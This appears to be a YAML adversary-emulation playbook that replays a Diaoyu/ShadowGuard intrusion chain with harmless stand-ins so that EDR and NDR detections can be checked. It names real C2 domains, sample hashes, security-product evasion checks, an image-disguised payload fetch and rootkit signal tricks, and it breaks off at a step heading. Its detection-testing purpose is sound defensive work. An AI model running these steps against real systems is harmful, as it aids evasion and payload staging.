steps:
  - id: step-01
    name: "Lure ZIP extracted and its same-named executable run beside a zero-byte pic1.png"
    command: |
      $d = Join-Path $env:TEMP 'cortexsim-mp-029'
      $lure = 'Politsei- ja Piirivalveameti organisatsiooni struktuuri muudatused'
      New-Item -ItemType Directory -Force -Path "$d\stage" | Out-Null
      Copy-Item -Path "$env:WINDIR\System32\whoami.exe" -Destination "$d\stage\$lure.exe" -Force
      New-Item -ItemType File -Force -Path "$d\stage\pic1.png" | Out-Null
      Compress-Archive -Path "$d\stage\*" -DestinationPath "$d\$lure.zip" -Force
      Expand-Archive -Path "$d\$lure.zip" -DestinationPath "$d\run" -Force
      Start-Process -FilePath "$d\run\$lure.exe" -ArgumentList '/all' -WorkingDirectory "$d\run" -Wait -NoNewWindow
      $global:LASTEXITCODE = 0
      Write-Output cortexsim-mp-029-lure-executed
    platform_variants:
      linux: |
        D=/tmp/cortexsim-mp-029
        LURE='Politsei- ja Piirivalveameti organisatsiooni struktuuri muudatused'
        mkdir -p "$D/stage" "$D/run"
        cp /usr/bin/id "$D/stage/$LURE"
        : > "$D/stage/pic1.png"
        (cd "$D/stage" && python3 -m zipfile -c "$D/$LURE.zip" "$LURE" pic1.png)
        python3 -m zipfile -e "$D/$LURE.zip" "$D/run"
        chmod +x "$D/run/$LURE"
        (cd "$D/run" && "./$LURE")
        echo cortexsim-mp-029-lure-executed
    identity: direct
    mitre_technique: "T1204.002"
    # Root of the causality spine — links from the CGO (explorer.exe).
    platforms: ["windows", "linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "An executable extracted from a ZIP into a user temp directory runs from a directory that also holds a zero-byte pic1.png — the Diaoyu lure layout (the loader exits if pic1.png is missing). The BIOC is single-event: it keys on the lure-named (organisatsiooni) execution path and the archive-expansion parent, not on a hash; the pic1.png sibling is confirmed by the step-01 validation query."
        ttp_ref: "TTP-2026-0188"
        detection_id: "bioc-mp-029-archive-extracted-executable-runs-beside-a-zero-byte-pic1-png-decoy"
      - plane: EDR
        type: XQL
        description: "Validation query joins the extracted lure executable start to a zero-byte pic1.png written on the same run host in xdr_data within the window (the decoy-sibling check the BIOC leaves out)."
        ttp_ref: "TTP-2026-0188"
        detection_id: "xql-mp-029-lure-execution-lineage-validation-in-xdr-data"

  - id: step-02
    name: "Diaoyu environment checks — five EDR process names, screen width, decoy presence"
    command: |
      $d = Join-Path $env:TEMP 'cortexsim-mp-029\run'
      foreach ($p in 'Avp','SentryEye','EPSecurityService','SentinelUI','NortonSecurity') { Get-Process -Name $p -ErrorAction SilentlyContinue | Out-Null }
      tasklist.exe /FI "IMAGENAME eq SentinelUI.exe" /NH | Out-File -FilePath "$d\edr-check.txt"
      Get-CimInstance -ClassName Win32_VideoController | Select-Object CurrentHorizontalResolution | Out-File -FilePath "$d\res.txt"
      Test-Path -Path "$d\pic1.png" | Out-File -FilePath "$d\decoy.txt"
      $global:LASTEXITCODE = 0
      Write-Output cortexsim-mp-029-environment-checks-done
    platform_variants:
      linux: |
        D=/tmp/cortexsim-mp-029/run
        ps -eo comm > "$D/proc.txt"
        grep -iE 'Avp|SentryEye|EPSecurityService|SentinelUI|NortonSecurity' "$D/proc.txt" > "$D/edr-check.txt" || true
        pgrep -l -f 'SentinelUI|NortonSecurity|EPSecurityService' >> "$D/edr-check.txt" || true
        cat /sys/class/graphics/fb0/virtual_size > "$D/res.txt" 2>/dev/null || true
        test -f "$D/pic1.png" && echo decoy-present > "$D/decoy.txt"
        echo cortexsim-mp-029-environment-checks-done
    identity: direct
    mitre_technique: "T1518.001"
    causality:
      parent_step: step-01
      pivot: process_lineage
    platforms: ["windows", "linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A process descended from the lure enumerates running processes for the exact five security-product images Diaoyu checks (Avp.exe, SentryEye.exe, EPSecurityService.exe, SentinelUI.exe, NortonSecurity.exe) and queries display resolution — security-software discovery plus a sandbox system check from a freshly extracted, user-temp executable lineage."
        ttp_ref: "TTP-2026-0188"
        detection_id: "bioc-mp-029-diaoyu-security-product-process-name-discovery"

  - id: step-03
    name: "Pull image-named stages (padeqav/WordPress URI shape) from the lab stage host into the lure directory"
    command: |
      if (-not $env:STAGE_HOST) { $env:STAGE_HOST = '127.0.0.1' }
      $d = Join-Path $env:TEMP 'cortexsim-mp-029\run'
      $base = "http://$($env:STAGE_HOST)/padeqav/WordPress/refs/heads/master/wp-includes/images"
      foreach ($f in 'admin-bar-sprite.png','Windows.jpg') { try { Invoke-WebRequest -Uri "$base/$f" -OutFile (Join-Path $d $f) -UseBasicParsing -TimeoutSec 5 } catch { Set-Content -Path (Join-Path $d $f) -Value 'cortexsim-mp-029-stage-placeholder' } }
      Copy-Item -Path (Join-Path $d 'Windows.jpg') -Destination (Join-Path $d 'Windows.bin') -Force
      Get-FileHash -Algorithm SHA256 -Path (Join-Path $d 'Windows.bin') | Out-File -FilePath (Join-Path $d 'stage.sha256')
      $global:LASTEXITCODE = 0
      Write-Output cortexsim-mp-029-stages-written
    platform_variants:
      linux: |
        D=/tmp/cortexsim-mp-029/run
        BASE="http://${STAGE_HOST:-127.0.0.1}/padeqav/WordPress/refs/heads/master/wp-includes/images"
        for f in admin-bar-sprite.png Linux.jpg; do curl -s --max-time 5 -o "$D/$f" "$BASE/$f" || echo cortexsim-mp-029-stage-placeholder > "$D/$f"; done
        cp "$D/Linux.jpg" "$D/Linux.bin"
        sha256sum "$D/Linux.bin" > "$D/stage.sha256"
        echo cortexsim-mp-029-stages-written
    identity: direct
    mitre_technique: "T1105"
    causality:
      parent_step: step-02
      pivot: network_session
    platforms: ["windows", "linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "The lure lineage fetches files with image extensions (admin-bar-sprite.png, Windows.jpg / Linux.jpg) over HTTP on the padeqav/WordPress wp-includes/images URI shape into its own execution directory and re-writes one as a non-image file — ingress tool transfer disguised as images, keyed on the URI shape and the image-to-binary rewrite, not on the (lab) destination."
        ttp_ref: "TTP-2026-0188"
        detection_id: "bioc-mp-029-image-named-payload-staged-into-a-lure-execution-directory"

  - id: step-04
    name: "Resolve TGR-STA-1030 domains through the operator-named lab resolver (no session opened)"
    command: |
      if (-not $env:LAB_RESOLVER) { $env:LAB_RESOLVER = '127.0.0.1' }
      nslookup abwxjp5.me $env:LAB_RESOLVER
      nslookup msonline.help $env:LAB_RESOLVER
      nslookup servgate.me $env:LAB_RESOLVER
      nslookup zamstats.me $env:LAB_RESOLVER
      $global:LASTEXITCODE = 0
      Write-Output cortexsim-mp-029-c2-domains-looked-up
    platform_variants:
      linux: |
        dig +short abwxjp5.me @${LAB_RESOLVER:-127.0.0.53}
        dig +short msonline.help @${LAB_RESOLVER:-127.0.0.53}
        dig +short servgate.me @${LAB_RESOLVER:-127.0.0.53}
        dig +short zamstats.me @${LAB_RESOLVER:-127.0.0.53}
        echo cortexsim-mp-029-c2-domains-looked-up
    identity: direct
    mitre_technique: "T1071.001"
    causality:
      parent_step: step-03
      pivot: network_session
    platforms: ["windows", "linux"]
    expected_detections:
      - plane: EDR
        type: IOC
        description: "IOC rule on the Unit 42 domain abwxjp5.me matches the endpoint DNS query from the lure lineage."
        ttp_ref: "TTP-2026-0188"
        detection_id: "ioc-domain-abwxjp5-me"
      - plane: EDR
        type: IOC
        description: "IOC rule on the Unit 42 domain msonline.help matches the endpoint DNS query from the lure lineage."
        ttp_ref: "TTP-2026-0188"
        detection_id: "ioc-domain-msonline-help"
      - plane: EDR
        type: IOC
        description: "IOC rule on the Unit 42 domain servgate.me matches the endpoint DNS query from the lure lineage."
        ttp_ref: "TTP-2026-0188"
        detection_id: "ioc-domain-servgate-me"
      - plane: EDR
        type: IOC
        description: "IOC rule on the Unit 42 domain zamstats.me matches the endpoint DNS query from the lure lineage."
        ttp_ref: "TTP-2026-0188"
        detection_id: "ioc-domain-zamstats-me"
      - plane: EDR
        type: XQL
        description: "Validation query confirms the four report-domain DNS queries landed in xdr_data on the run host within the window."
        ttp_ref: "TTP-2026-0188"
        detection_id: "xql-mp-029-report-c2-domain-lookups-validation-in-xdr-data"

  - id: step-05
    name: "NGFW WildFire threat logs for the lure ZIP and Diaoyu executable on the run host"
    command: |
      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
      SRC_IP=$(hostname -I | awk '{print $1}')
      SRC_HOST=$(hostname -s)
      SRC_USER=$(id -un)
      SRC_IP="${VICTIM_SRC_IP:-$SRC_IP}"
      SRC_HOST="${VICTIM_SRC_HOST:-$SRC_HOST}"
      SRC_USER="${VICTIM_SRC_USER:-$SRC_USER}"
      cat > /tmp/mp-029-delivery.yml <<YML
      campaign_id: CMP-MP-DELIVERY-029
      name: "TGR-STA-1030 — lure ZIP and Diaoyu executable WildFire verdicts"
      authorized_by: "domain-consultant@paloaltonetworks.com"
      simulation_authorized: true
      target_allowlist:
        - "$COLLECTOR_HOST"
      dry_run: false
      tags: [unit42, tgr-sta-1030, stitched-chain]
      steps:
        - step_id: step-01
          plugin: ngfw_threat_emitter
          params:
            collector_url: "$COLLECTOR_URL"
            event_pattern: wildfire_malicious_file
            file_sha256: "66ec547b97072828534d43022d766e06c17fc1cafe47fbd9d1ffc22e2d52a9c0"
            file_name: "Politsei- ja Piirivalveameti organisatsiooni struktuuri muudatused.zip"
            file_type: "zip"
            verdict: malicious
            app: "web-browsing"
            action: alert
            src_ip: "$SRC_IP"
            src_host: "$SRC_HOST"
            src_user: "$SRC_USER"
        - step_id: step-02
          plugin: ngfw_threat_emitter
          params:
            collector_url: "$COLLECTOR_URL"
            event_pattern: wildfire_malicious_file
            file_sha256: "23ee251df3f9c46661b33061035e9f6291894ebe070497ff9365d6ef2966f7fe"
            file_name: "Politsei- ja Piirivalveameti organisatsiooni struktuuri muudatused.exe"
            file_type: "PE"
            verdict: malicious
            app: "web-browsing"
            action: alert
            src_ip: "$SRC_IP"
            src_host: "$SRC_HOST"
            src_user: "$SRC_USER"
      YML
      python3 -m scripts.eal_simulator.cli run /tmp/mp-029-delivery.yml --live
      echo cortexsim-mp-029-lure-threat-logs-emitted
    identity: direct
    mitre_technique: "T1566.002"
    causality:
      parent_step: step-01
      pivot: endpoint_network_stitch
    platforms: ["linux"]
    expected_detections:
      - plane: NDR
        type: IOC
        description: "IOC rule on the Unit 42 lure-archive sha256 matches the filedigest of the NGFW WildFire threat log for the reorganisation-themed ZIP, on the same src_host as the endpoint lure lineage."
        ttp_ref: "TTP-2026-0188"
        detection_id: "ioc-file-sha256-66ec547b97072828534d43022d766e06c17fc1cafe47fbd9d1ffc22e2d52a9c0"
      - plane: NDR
        type: IOC
        description: "IOC rule on the Unit 42 Diaoyu-executable sha256 matches the filedigest of the NGFW WildFire threat log, on the same src_host."
        ttp_ref: "TTP-2026-0188"
        detection_id: "ioc-file-sha256-23ee251df3f9c46661b33061035e9f6291894ebe070497ff9365d6ef2966f7fe"
      - plane: NDR
        type: XQL
        description: "Validation query confirms the threat logs landed in panw_ngfw_threat_raw carrying the report sha256 values and the run host's src_host within the window."
        ttp_ref: "TTP-2026-0188"
        detection_id: "xql-mp-029-wildfire-threat-logs-carry-report-hashes-on-the-run-host"

  - id: step-06
    name: "ShadowGuard behaviour on Linux — eBPF/tracepoint probes, kill -900/-901 allow-list signals, swsecret artifacts"
    command: |
      D=/tmp/cortexsim-mp-029/shadowguard
      mkdir -p "$D"
      id -u > "$D/euid.txt"
      ls /sys/fs/bpf > "$D/bpffs.txt" 2>&1 || true
      cat /proc/sys/kernel/unprivileged_bpf_disabled > "$D/bpf-sysctl.txt" 2>&1 || true
      ls /sys/kernel/tracing/events/syscalls/sys_enter_kill > "$D/tracepoint.txt" 2>&1 || true
      : > "$D/swsecret_config.txt"
      mkdir -p "$D/swsecret_data"
      sleep 30 &
      PID=$!
      /bin/kill -900 "$PID" 2>/dev/null || true
      /bin/kill -901 "$PID" 2>/dev/null || true
      kill "$PID" 2>/dev/null || true
      logger -t cortexsim-mp-029 "report_shadowguard_sha256=7808b1e01ea790548b472026ac783c73a033bb90bbe548bf3006abfbcb48c52d"
      echo cortexsim-mp-029-shadowguard-behaviour-exercised
    identity: root
    mitre_technique: "T1014"
    causality:
      parent_step: step-03
      pivot: shared_entity
    platforms: ["linux"]
    expected_detections:
      - plane: EDR
        type: BIOC
        description: "A root process runs kill with the non-standard signal numbers 900 and 901 — ShadowGuard's allow-list add/remove commands intercepted by its eBPF kill hook — right after probing /sys/fs/bpf and the sys_enter_kill tracepoint. Keyed on the command line, which no legitimate tool emits."
        ttp_ref: "TTP-2026-0188"
        detection_id: "bioc-mp-029-shadowguard-custom-kill-signal-allow-list-manipulation"
      - plane: EDR
        type: BIOC
        description: "A root process creates a file and a directory whose names start with swsecret (swsecret_config.txt, swsecret_data) — ShadowGuard's hard-coded hidden-artifact names."
        ttp_ref: "TTP-2026-0188"
        detection_id: "bioc-mp-029-shadowguard-swsecret-hidden-artifact-creation"
      - plane: EDR
        type: XQL
        description: "Validation query confirms the kill -900/-901 executions and swsecret file creation landed in xdr_data on the run host within the window."
        ttp_ref: "TTP-2026-0188"
        detection_id: "xql-mp-029-shadowguard-behaviour-validation-in-xdr-data"

  - id: step-07
    name: "Cobalt Strike payload verdict, recurring HTTPS beacon and SSH relay session to TGR-STA-1030 infrastructure"
